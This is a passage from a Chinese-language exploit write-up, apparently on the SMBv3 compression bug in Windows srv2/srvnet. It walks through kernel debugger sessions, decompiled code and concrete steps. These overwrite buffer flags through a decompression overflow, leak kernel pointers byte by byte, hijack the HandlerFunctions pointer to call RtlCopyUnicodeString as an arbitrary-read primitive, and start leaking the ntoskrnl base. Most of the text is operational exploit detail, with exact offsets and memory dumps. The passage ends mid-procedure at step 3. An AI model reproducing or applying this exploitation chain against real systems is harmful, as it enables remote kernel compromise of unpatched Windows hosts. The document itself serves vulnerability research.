    ffffa508`31ac9188  34803aa8 ffffa508 00000000 00000000
    ffffa508`31ac9198  00000000 00000000 36241250 ffffa508
    ffffa508`31ac91a8  00000000 00000000 00000000 00000000
之后通过解压覆盖偏移0x10处的BufferFlags，使其由2变为3，压缩数据后面加入多个”\xFF”使得解压失败，这样在后续调用
SrvNetFreeBuffer函数时才能进入上述流程。其中：flag第一个比特位被设置代表没有Transport
Header，所以那段代码实际上是留出了传输头。
    kd> dd r9-10
    ffffa508`31ac9150  00000000 00000000 34ba42d8 ffffa508
    ffffa508`31ac9160  00040002 00000000 31ab9050 ffffa508
    ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
    ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
    ffffa508`31ac9190  00000000 00000000 00000000 00000000
    ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000
    kd> dd ffffa508`31ac9150
    ffffa508`31ac9150  00000000 00000000 34ba42d8 ffffa508
    ffffa508`31ac9160  00040003 00000000 31ab9050 ffffa508
    ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
    ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
    ffffa508`31ac9190  00000000 00000000 00000000 00000000
    ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000
当调用SrvNetFreeBuffer释放这个缓冲区时会触发那段流程，此时想泄露的数据已经放在了0xffffa50836241250处的MDL结构中。如下所示，为0xffffa5083506b848。然后再用之前的方法依次泄露0xffffa50836241250偏移0x2D、0x2C、0x25、0x24、0x23、0x22、0x21处的字节，然后组合成0xffffa5083506b848。
    kd> dt _mdl ffffa50836241250 
    win32k!_MDL
       +0x000 Next             : (null) 
       +0x008 Size             : 0n56
       +0x00a MdlFlags         : 0n4
       +0x00c AllocationProcessorNumber : 0
       +0x00e Reserved         : 0
       +0x010 Process          : (null) 
       +0x018 MappedSystemVa   : (null) 
       +0x020 StartVa          : 0xffffa508`3506b000 Void
       +0x028 ByteCount        : 0xffffffb0
       +0x02c ByteOffset       : 0x848
    kd> db ffffa50836241250 
    ffffa508`36241250  00 00 00 00 00 00 00 00-38 00 04 00 00 00 00 00  ........8.......
    ffffa508`36241260  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`36241270  00 b0 06 35 08 a5 ff ff-b0 ff ff ff 48 08 00 00  ...5........H...
    kd> ?poi(ffffa508`34803aa8+18)   //AcceptSocket - 0x50
    Evaluate expression: -100020308756408 = ffffa508`3506b848
由于之前flag加上了1，没有传输头，所以SRVNET_BUFFER_HDR偏移0x18处的user
data指针比之前多0x50（计算偏移的时候要注意）。这次将BufferFlags覆盖为0，在SrvNetFreeBuffer函数中就不会将其直接加入SrvNetBufferLookasides表，而是释放该缓冲区。
    kd> dd r9-10
    ffffa508`31ac9150  00000000 00000000 35caba58 ffffa508
    ffffa508`31ac9160  00040002 00000000 31ab90a0 ffffa508
    ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
    ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
    ffffa508`31ac9190  00000000 00000000 00000000 00000000
    ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000
    kd> dd ffffa508`31ac9150
    ffffa508`31ac9150  00000000 00000000 35caba58 ffffa508
    ffffa508`31ac9160  00040000 00000000 31ab90a0 ffffa508
    ffffa508`31ac9170  00010100 00000000 00010368 ffffa508
    ffffa508`31ac9180  31ab9000 ffffa508 34803aa8 ffffa508
    ffffa508`31ac9190  00000000 00000000 00000000 00000000
    ffffa508`31ac91a0  36241250 ffffa508 00000000 00000000
后面还是和之前一样，依次从高地址到低地址泄露每一个字节，经过组合最终得到后面还是和之前一样，依次从高地址到低地址泄露每一个字节，经过组合最终得到AcceptSocket地址为
0xffffa5083506b848 – 0x50 = 0xffffa508`3506b7f8。
    kd> db ffffa508`36241250+2d-10
    ffffa508`3624126d  00 00 00 00 b0 06 35 08-a5 ff ff b0 ff ff ff 48  ......5........H
    ffffa508`3624127d  08 b0 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`3624128d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`3624129d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`362412ad  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`362412bd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`362412cd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`362412dd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................................
    kd> u poi(ffffa508`3506b7f8+30)
    srvnet!SrvNetWskConnDispatch:
    fffff802`57d3d170 50              push    rax
    fffff802`57d3d171 5a              pop     rdx
    fffff802`57d3d172 d15702          rcl     dword ptr [rdi+2],1
    fffff802`57d3d175 f8              clc
    fffff802`57d3d176 ff              ???
    fffff802`57d3d177 ff00            inc     dword ptr [rax]
    fffff802`57d3d179 6e              outs    dx,byte ptr [rsi]
    fffff802`57d3d17a d15702          rcl     dword ptr [rdi+2],1
采用同样的方法可获取AcceptSocket偏移0x30处的srvnet!SrvNetWskConnDispatch函数的地址。
###  泄露ntoskrnl基址
**任意地址读**
SrvNetCommonReceiveHandler函数中存在如下代码，其中v10指向SRVNET_RECV结构体，以下代码是对srv2!Srv2ReceiveHandler函数的调用（HandlerFunctions表中的第二项），第一个参数来自于SRVNET_RECV结构体偏移0x128处，第二个参数来自于SRVNET_RECV结构体偏移0x130处。可通过覆盖SRVNET_RECV结构偏移0x118、0x128、0x130处的数据，进行已知函数的调用（参数个数不大于2）。
    //srvnet!SrvNetCommonReceiveHandler
      v32 = *(_QWORD *)(v10 + 0x118);
      v33 = *(_QWORD *)(v10 + 0x130);
      v34 = *(_QWORD *)(v10 + 0x128);
      *(_DWORD *)(v10 + 0x144) = 3;
      v35 = (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, _QWORD, __int64, __int64, __int64, __int64, __int64))(v32 + 8))( v34, v33, v8, (unsigned int)v11, v9, a5, v7, a7, v55);
以下为RtlCopyUnicodeString函数部分代码，该函数可通过srvnet!imp_RtlCopyUnicodeString索引，并且只需要两个参数（PUNICODE_STRING结构）。如下所示，PUNICODE_STRING中包含Length、MaximumLength（偏移2）和Buffer（偏移8）。RtlCopyUnicodeString函数会调用memmove将SourceString->Buffer复制到DestinationString->Buffer，复制长度为SourceString->Length和DestinationString->MaximumLength中的最小值。
    //RtlCopyUnicodeString
    void __stdcall RtlCopyUnicodeString(PUNICODE_STRING DestinationString, PCUNICODE_STRING SourceString)
    {
      v2 = DestinationString;
      if ( SourceString )
      {
        v3 = SourceString->Length;
        v4 = DestinationString->MaximumLength;
        v5 = SourceString->Buffer;
        if ( (unsigned __int16)v3 Buffer;
        v7 = v4;
        DestinationString->Length = v4;
        memmove(v6, v5, v4);
    //PUNICODE_STRING
    typedef struct __UNICODE_STRING_
    {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING;
    typedef UNICODE_STRING *PUNICODE_STRING;
    typedef const UNICODE_STRING *PCUNICODE_STRING;
可通过覆盖HandlerFunctions，“替换”srv2!Srv2ReceiveHandler函数指针为nt!RtlCopyUnicodeString函数指针，覆盖DestinationString为已知地址的PUNICODE_STRING结构地址，SourceString为待读取地址的PUNICODE_STRING结构地址，然后通过向该连接继续发送请求实现任意地址数据读取。
**ntoskrnl泄露步骤**
1、首先还是要获取一个ConnectionBufferList的地址，本次调试为0xffffa50834ba42d8。  
2、利用任意地址写，将特定数据写入可控的缓冲区（0x2100缓冲区）的已知偏移处。成功复制后，0xffffa50836241658处为0xffffa50836241670，正好指向复制数据的后面，0xffffa50836241668处为0xfffff80257d42210（srvnet!imp_IoSizeofWorkItem），指向nt!IoSizeofWorkItem函数（此次要泄露nt!IoSizeofWorkItem函数地址）。
    //要复制的数据
    kd> dd ffffa508`36240050
    ffffa508`36240050  424d53fc ffffffff 00000001 00000020
    ffffa508`36240060  00060006 00000000 36241670 ffffa508
    ffffa508`36240070  00060006 00000000 57d42210 fffff802
    kd> dd ffffa508`2fe38050+1100  //任意地址写，注意0xffffa5082fe39168处数据
    ffffa508`2fe39150  35c3e150 ffffa508 34803a18 ffffa508
    ffffa508`2fe39160  00000002 00000000 2fe38050 ffffa508
    ffffa508`2fe39170  00001100 00000000 00001278 00000400
    kd> p
    srv2!Srv2DecompressData+0xe1:
    fffff802`51ce7f41 85c0            test    eax,eax
    kd> dd ffffa508`2fe38050+1100 //要复制的可控地址（0x18处）
    ffffa508`2fe39150  00000000 00000000 00000000 00000000
    ffffa508`2fe39160  00000000 00000000 36241650 ffffa508
    ffffa508`2fe39170  00001100 00000000 00001278 00000400
    kd> g
    copy: ffffa508`36241650  00000000`00000000 00000000`00000000
    srv2!Srv2DecompressData+0x108:
    fffff802`51ce7f68 e85376ffff      call    srv2!memcpy (fffff802`51cdf5c0)
    kd> dd rcx
    ffffa508`36241650  00000000 00000000 00000000 00000000
    ffffa508`36241660  00000000 00000000 00000000 00000000
    kd> p
    srv2!Srv2DecompressData+0x10d:
    fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
    kd> dd ffffa508`36241650  //成功复制
    ffffa508`36241650  00060006 00000000 36241670 ffffa508
    ffffa508`36241660  00060006 00000000 57d42210 fffff802
    //nt!IoSizeofWorkItem函数指针
    kd> u poi(fffff80257d42210)
    nt!IoSizeofWorkItem:
    fffff802`52c7f7a0 b858000000      mov     eax,58h
    fffff802`52c7f7a5 c3              ret
3、利用任意地址写将srvnet!imp_RtlCopyUnicodeString指针-8的地址写入SRVNET_RECV结构偏移0x118处的HandlerFunctions，这样系统会认为nt!RtlCopyUnicodeString指针是srv2!Srv2ReceiveHandler函数指针。